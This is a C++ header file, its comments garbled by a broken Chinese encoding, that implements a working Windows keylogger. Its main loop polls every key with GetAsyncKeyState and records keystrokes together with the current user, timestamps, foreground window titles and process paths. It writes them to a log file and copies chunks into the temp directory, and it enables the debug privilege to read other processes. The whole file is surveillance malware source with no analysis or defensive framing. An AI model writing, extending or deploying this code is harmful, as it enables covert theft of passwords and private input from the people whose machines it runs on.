#pragma once
// GetAsyncKeyState ʹ�ô˺�����ȡ
// Filename ȫ�ֱ�����̼�¼�ĵ��ļ� Ĭ��λ��ΪexeͬĿ¼���������������ļ�
#include <iostream>
#include <stdlib.h>
#include <atlstr.h>
#include <Windows.h>
#include <WinUser.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string>
#include <fstream>
#include "common.h"
#include "file.h"

using namespace std;

#define MAXFILELENGTH    1024  //��¼�����ļ�����ַ������� ʵʱ������Ҫ

#pragma comment(lib,"Kernel32.lib") 
string Filename = "C:\\log.txt";//��¼�ı�exeͬĿ¼��,Ĭ����C:\\log.txtĿ¼�� 

//��ǰĿ¼��������־�ļ� workDir\date.txt
string generateLogFile(void)
{
	//��õ�ǰ��¼�û���
	string userName = GetCurrentUser();
	cout << "current User:" << userName << endl;
	string path = GetCurrentWorkDir();
	cout << "current Path: " << path << endl;
	CString date = GetDate();
	cout << "current date: " << date << endl;
	Filename = GetCurrentWorkDir() + "\\" + string(GetDate()) + ".txt";
	cout << "logFileName: " << Filename << endl;
	return Filename;
}


// �жϼ��̰���ʲô��
string GetKey(int Key)
{
	string KeyString = "";
	//�жϷ�������
	const int KeyPressMask = 0x80000000; //�������볣��
	int iShift = GetKeyState(0x10); //�ж�Shift��״̬
	bool IS = (iShift & KeyPressMask) == KeyPressMask; //��ʾ����Shift��
	if (Key >= 186 && Key <= 222)
	{
		switch (Key)
		{
		case 186:
			if (IS)
				KeyString = ":";
			else
				KeyString = ";";
			break;
		case 187:
			if (IS)
				KeyString = "+";
			else
				KeyString = "=";
			break;
		case 188:
			if (IS)
				KeyString = "<";
			else
				KeyString = ",";
			break;
		case 189:
			if (IS)
				KeyString = "_";
			else
				KeyString = "-";
			break;
		case 190:
			if (IS)
				KeyString = ">";
			else
				KeyString = ".";
			break;
		case 191:
			if (IS)
				KeyString = "?";
			else
				KeyString = "/";
			break;
		case 192:
			if (IS)
				KeyString = "~";
			else
				KeyString = "`";
			break;
		case 219:
			if (IS)
				KeyString = "{";
			else
				KeyString = "[";
			break;
		case 220:
			if (IS)
				KeyString = "|";
			else
				KeyString = "\\";
			break;
		case 221:
			if (IS)
				KeyString = "}";
			else
				KeyString = "]";
			break;
		case 222:
			if (IS)
				KeyString = '"';
			else
				KeyString = "'";
			break;
		}
	}
	//�жϼ��̵ĵ�һ��
	if (Key == VK_ESCAPE) // �˳�
		KeyString = "[Esc]";
	else if (Key == VK_F1) // F1��F12
		KeyString = "[F1]";
	else if (Key == VK_F2)
		KeyString = "[F2]";
	else if (Key == VK_F3)
		KeyString = "[F3]";
	else if (Key == VK_F4)
		KeyString = "[F4]";
	else if (Key == VK_F5)
		KeyString = "[F5]";
	else if (Key == VK_F6)
		KeyString = "[F6]";
	else if (Key == VK_F7)
		KeyString = "[F7]";
	else if (Key == VK_F8)
		KeyString = "[F8]";
	else if (Key == VK_F9)
		KeyString = "[F9]";
	else if (Key == VK_F10)
		KeyString = "[F10]";
	else if (Key == VK_F11)
		KeyString = "[F11]";
	else if (Key == VK_F12)
		KeyString = "[F12]";
	else if (Key == VK_SNAPSHOT) // ��ӡ��Ļ
		KeyString = "[PrScrn]";
	else if (Key == VK_SCROLL) // ��������
		KeyString = "[Scroll Lock]";
	else if (Key == VK_PAUSE) // ��ͣ���ж�
		KeyString = "[Pause]";
	else if (Key == VK_CAPITAL) // ��д����
		KeyString = "[Caps Lock]";

	//-------------------------------------//
	//���Ƽ�
	else if (Key == 8) //<- �ظ��
		KeyString = "[Backspace]";
	else if (Key == VK_RETURN) // �س���������
		KeyString = "[Enter]\n";
	else if (Key == VK_SPACE) // �ո�
		KeyString = " ";
	//�ϵ���:���̼�¼��ʱ�򣬿��Բ���¼��������Shift�ǲ������κ��ַ���
	//�ϵ����ͱ�ļ���ϣ����ʱ���ַ����
	/*
	else if (Key == VK_LSHIFT) // ����ϵ���
	KeyString = "[Shift]";
	else if (Key == VK_LSHIFT) // �Ҳ��ϵ���
	KeyString = "[SHIFT]";
	*/
	/*���ֻ�ǶԼ����������ĸ���м�¼:���Բ������¼�������ļ�*/
	else if (Key == VK_TAB) // �Ʊ��
		KeyString = "[Tab]";
	else if (Key == VK_LCONTROL) // ����Ƽ�
		KeyString = "[Ctrl]";
	else if (Key == VK_RCONTROL) // �ҿ��Ƽ�
		KeyString = "[CTRL]";
	else if (Key == VK_LMENU) // �󻻵���
		KeyString = "[Alt]";
	else if (Key == VK_LMENU) // �һ�����
		KeyString = "[ALT]";
	else if (Key == VK_LWIN) // �� WINDOWS ��
		KeyString = "[Win]";
	else if (Key == VK_RWIN) // �� WINDOWS ��
		KeyString = "[WIN]";
	else if (Key == VK_APPS) // ������ �Ҽ�
		KeyString = "�Ҽ�";
	else if (Key == VK_INSERT) // ����
		KeyString = "[Insert]";
	else if (Key == VK_DELETE) // ɾ��
		KeyString = "[Delete]";
	else if (Key == VK_HOME) // ��ʼ
		KeyString = "[Home]";
	else if (Key == VK_END) // ����
		KeyString = "[End]";
	else if (Key == VK_PRIOR) // ��һҳ
		KeyString = "[PgUp]";
	else if (Key == VK_NEXT) // ��һҳ
		KeyString = "[PgDown]";
	// �����õļ�����:һ�����û��
	else if (Key == VK_CANCEL) // Cancel
		KeyString = "[Cancel]";
	else if (Key == VK_CLEAR) // Clear
		KeyString = "[Clear]";
	else if (Key == VK_SELECT) //Select
		KeyString = "[Select]";
	else if (Key == VK_PRINT) //Print
		KeyString = "[Print]";
	else if (Key == VK_EXECUTE) //Execute
		KeyString = "[Execute]";

	//----------------------------------------//
	else if (Key == VK_LEFT) //�ϡ��¡����Ҽ�
		KeyString = "[��]";
	else if (Key == VK_RIGHT)
		KeyString = "[��]";
	else if (Key == VK_UP)
		KeyString = "[��]";
	else if (Key == VK_DOWN)
		KeyString = "[��]";
	else if (Key == VK_NUMLOCK)//С������������
		KeyString = "[NumLock]";
	else if (Key == VK_ADD) // �ӡ������ˡ���
		KeyString = "+";
	else if (Key == VK_SUBTRACT)
		KeyString = "-";
	else if (Key == VK_MULTIPLY)
		KeyString = "*";
	else if (Key == VK_DIVIDE)
		KeyString = "/";
	else if (Key == 190 || Key == 110) // С���� . ������ .
		KeyString = ".";
	//С�������ּ�:0-9
	else if (Key == VK_NUMPAD0)
		KeyString = "0";
	else if (Key == VK_NUMPAD1)
		KeyString = "1";
	else if (Key == VK_NUMPAD2)
		KeyString = "2";
	else if (Key == VK_NUMPAD3)
		KeyString = "3";
	else if (Key == VK_NUMPAD4)
		KeyString = "4";
	else if (Key == VK_NUMPAD5)
		KeyString = "5";
	else if (Key == VK_NUMPAD6)
		KeyString = "6";
	else if (Key == VK_NUMPAD7)
		KeyString = "7";
	else if (Key == VK_NUMPAD8)
		KeyString = "8";
	else if (Key == VK_NUMPAD9)
		KeyString = "9";
	//-------------------------------------------//

	//-------------------------------------------//
	//*����ĸ�Ĵ�Сд�����ж�*//
	else if (Key >= 97 && Key <= 122) // ��ĸ:a-z
	{
		if (GetKeyState(VK_CAPITAL)) // ��д����
		{
			if (IS) //Shift����:ΪСд��ĸ
				KeyString = Key;
			else // ֻ�д�д����:�����д��ĸ
				KeyString = Key - 32;
		}
		else// ��дû������
		{
			if (IS) // ����Shift��: ��д��ĸ
				KeyString = Key - 32;
			else // û�а�Shift��: Сд��ĸ
				KeyString = Key;
		}
	}
	else if (Key >= 48 && Key <= 57) // ��������:0-9���Ϸ��ķ���
	{
		if (IS)
		{
			switch (Key)
			{
			case 48: //0
				KeyString = ")";
				break;
			case 49://1
				KeyString = "!";
				break;
			case 50://2
				KeyString = "@";
				break;
			case 51://3
				KeyString = "#";
				break;
			case 52://4
				KeyString = "$";
				break;
			case 53://5
				KeyString = "%";
				break;
			case 54://6
				KeyString = "^";
				break;
			case 55://7
				KeyString = "&";
				break;
			case 56://8
				KeyString = "*";
				break;
			case 57://9
				KeyString = "(";
				break;
			}
		}
		else
			KeyString = Key;
	}
	if (Key != VK_LBUTTON || Key != VK_RBUTTON)
	{
		if (Key >= 65 && Key <= 90) //ASCII 65-90 ΪA-Z
		{
			if (GetKeyState(VK_CAPITAL)) // ��д����:���A-Z
			{
				if (IS) // ��д���������Ұ����ϵ���:���ΪСд��ĸ
					KeyString = Key + 32;
				else //ֻ�д�д����:���Ϊ��д��ĸ
					KeyString = Key;
			}
			else // ��дû������:a-z
			{
				if (IS)
				{
					KeyString = Key;
				}
				else
				{
					Key = Key + 32;
					KeyString = Key;
				}
			}
		}
	}

	return KeyString;
}

//����ʱ���ַ���
CString getfilename(WORD year, WORD month, WORD day, WORD hour, WORD minute, WORD second) {
	CString year1, month1, day1, hour1, minute1, second1;
	year1.Format("%d", year);
	month1.Format("%d", month);
	day1.Format("%d", day);
	hour1.Format("%d", hour);
	minute1.Format("%d", minute);
	second1.Format("%d", second);
	CString path1 = year1 + "." + month1 + "." + day1 + "_" + hour1 + "." + minute1 + "." + second1;
	return path1;
}


// ͨ��PID��ȡ����·�� �޷����ϵͳ�Ľ��̾���·��
CString getProcPath(int PID)
{
	HANDLE hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	HANDLE hModule;
	PROCESSENTRY32* pinfo = new PROCESSENTRY32;
	MODULEENTRY32* minfo = new MODULEENTRY32;
	pinfo->dwSize = sizeof(PROCESSENTRY32);
	minfo->dwSize = sizeof(MODULEENTRY32);
	char shortpath[MAX_PATH] = "";
	hModule = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, PID);//pinfo->th32ProcessID);
	Module32First(hModule, minfo);



	CString str;
	str.Format("%s", minfo->szExePath);
	CloseHandle(hProcess);
	CloseHandle(hModule);
	if (pinfo) delete pinfo;
	if (minfo) delete minfo;
	return str;
}

//����Ȩ�޺���
BOOL EnablePrivilege(HANDLE hToken, LPCSTR szPrivName)
{

	TOKEN_PRIVILEGES tkp;

	LookupPrivilegeValue(NULL, szPrivName, &tkp.Privileges[0].Luid);//�޸Ľ���Ȩ��  
	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof tkp, NULL, NULL);//֪ͨϵͳ�޸Ľ���Ȩ��  

	return((GetLastError() == ERROR_SUCCESS));

}

//ͨ������PID��ȡ����·�� �޷����ϵͳ�Ľ��̾���·��
string GetProcessPathByPId(const DWORD dwProcessId)
{
	string KeyString = "";
	HANDLE hProcess = NULL;
	BOOL bSuccess = FALSE;
	HANDLE  hToken;
	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
	EnablePrivilege(hToken, SE_DEBUG_NAME);


	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, dwProcessId);
	do
	{
		if (NULL == hProcess)
		{
			break;
		}
		char szPath[MAX_PATH + 1] = { 0 };
		HMODULE hMod = NULL;
		DWORD cbNeeded = 0;
		if (FALSE == EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded))
		{
			break;
		}
		if (0 == GetModuleFileNameEx(hProcess, hMod, szPath, MAX_PATH))
		{
			break;
		}
		KeyString = szPath;
		bSuccess = TRUE;
	} while (0);
	if (NULL != hProcess)
	{
		CloseHandle(hProcess);
		hProcess = NULL;
	}
	return KeyString;
}

//DosPathתNTPath
BOOL DosPathToNtPath(LPTSTR pszDosPath, LPTSTR pszNtPath)
{
	TCHAR            szDriveStr[500];
	TCHAR            szDrive[3];
	TCHAR            szDevName[100];
	INT                cchDevName;
	INT                i;

	//������
	if (!pszDosPath || !pszNtPath)
		return FALSE;

	//��ȡ���ش����ַ���
	if (GetLogicalDriveStrings(sizeof(szDriveStr), szDriveStr))
	{
		for (i = 0; szDriveStr[i]; i += 4)
		{
			if (!lstrcmpi(&(szDriveStr[i]), _T("A:\\")) || !lstrcmpi(&(szDriveStr[i]), _T("B:\\")))
				continue;

			szDrive[0] = szDriveStr[i];
			szDrive[1] = szDriveStr[i + 1];
			szDrive[2] = '\0';
			if (!QueryDosDevice(szDrive, szDevName, 100))//��ѯ Dos �豸��
				return FALSE;

			cchDevName = lstrlen(szDevName);
			if (_tcsnicmp(pszDosPath, szDevName, cchDevName) == 0)//����
			{
				lstrcpy(pszNtPath, szDrive);//����������
				lstrcat(pszNtPath, pszDosPath + cchDevName);//����·��

				return TRUE;
			}
		}
	}

	lstrcpy(pszNtPath, pszDosPath);

	return FALSE;
}
//��ȡ��������·��  ���еķ���
BOOL GetProcessFullPath(DWORD dwPID, TCHAR pszFullPath[MAX_PATH])
{
	TCHAR        szImagePath[MAX_PATH];
	HANDLE        hProcess;
	if (!pszFullPath)
		return FALSE;

	pszFullPath[0] = '\0';
	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, 0, dwPID);
	if (!hProcess)
		return FALSE;

	if (!GetProcessImageFileName(hProcess, szImagePath, MAX_PATH))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	if (!DosPathToNtPath(szImagePath, pszFullPath))
	{
		CloseHandle(hProcess);
		return FALSE;
	}

	CloseHandle(hProcess);

	_tprintf(_T("%d,%s \r\n"), dwPID, pszFullPath);
	return TRUE;
}




// ���̼�¼��������
void keylog_main()
{

	WORD year, month, day, hour, minute, second;
	char wnd_title[256]; //���ڱ���
	HWND hwnd;
	HWND hwnd_new = GetForegroundWindow();
	SYSTEMTIME sys;//ʱ�����

	CString PrtScnPath;   //��ͼ�ļ������λ��
	CString PrtScnName;   //��ͼ�ļ�����
	CString file_string;  //�����Ľ�ͼ����.jpg��ʽ



	//�û� ʱ�� ����  ������Ϣ ��Ϊһ��Titleд���ļ�
	char writeStringTitle[1024] = { 0 };

	

	//ʵʱ�ش������̼�¼�ﵽһ�����Ⱥ�д����ʱĿ¼����ʱ�ļ��лش�����
	string realTimeString = "";
	while (1)
	{

		
		hwnd = hwnd_new;
		hwnd_new = GetForegroundWindow(); // get handle of currently active window ��ȡ��ǰ����ڵľ��
		GetWindowText(hwnd_new, wnd_title, sizeof(wnd_title));//���´��ڸ� 0
		//�л������ʱ���浱ǰǰ�ô��ڵĽ�ͼ

		if (hwnd != hwnd_new && hwnd_new != NULL)
		{
			GetLocalTime(&sys);
			year = sys.wYear; month = sys.wMonth; day = sys.wDay; hour = sys.wHour; minute = sys.wMinute; second = sys.wSecond;
			//�������п���ע�͵�����Լ��Դ
			cout << endl;
			cout << year << "/" << month << "/" << day << " " << hour << ":" << minute << ":" << second << " ";
			cout << wnd_title << " ";
			//�õ�����·��fullProcessImageName
			unsigned long iPID = 0;
			GetWindowThreadProcessId(hwnd_new, &iPID);
			char fullProcessImageName[MAX_PATH] = {0};
			GetProcessFullPath(iPID, fullProcessImageName);
			sprintf(writeStringTitle,"\n%s%s%04d/%02d/%02d %02d:%02d:%02d%s%s%s%s\n", GetCurrentUser().c_str(), SPLITCHAR,year, month, day, hour, minute, second, SPLITCHAR, fullProcessImageName, SPLITCHAR, wnd_title);
			cout << "change Window  Current Window Title: " << fullProcessImageName << endl;
			
			
			//Ŀǰ������ֻҪ�л����ھ�����¼ 
			Write(Filename, string(writeStringTitle));
			cout << "Write TO file " << writeStringTitle << endl;

			//{
			//	ofstream f1;
			//	f1.open(Filename, ios::app);
			//	f1 << writeStringTitle;
			//	realTimeString += writeStringTitle;
			//	f1.close();
			//}  ==>>   Write(string(Filename, writeStringTitle);


		}
		//���̼�¼��Ϣд���ļ�Filename
		

		
		Sleep(5); // ��ʱ5ms
		//ɨ�������  Ƶ����д.txt�ļ�

		string TempString = "";
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) & 1 == 1)
			{
				cout << GetKey(i);
				TempString = TempString  +  GetKey(i);
			}
		}
		if (TempString.size() > 0)
		{
			
			fstream FStream;
			FStream.open(Filename.c_str(), std::fstream::out | std::fstream::app);
			realTimeString += TempString;
			FStream.write(TempString.c_str(), TempString.size());
			FStream.close();

		}
		else {
			
		}

		//�����ļ����㳤��Ҫ��ʱ��¼һ��
		if (realTimeString.size() >= MAXFILELENGTH)
		{
			CString realTimeFileName;//
			realTimeFileName.Format("%s\\%s.txt", GetUserTmpPath().c_str(), getfilename(sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond));
			Write(string(realTimeFileName), realTimeString);
			cout << "realTimeFileName " << realTimeFileName << "realTimeString " << realTimeString << endl;
			realTimeString.clear();
		}
	}
}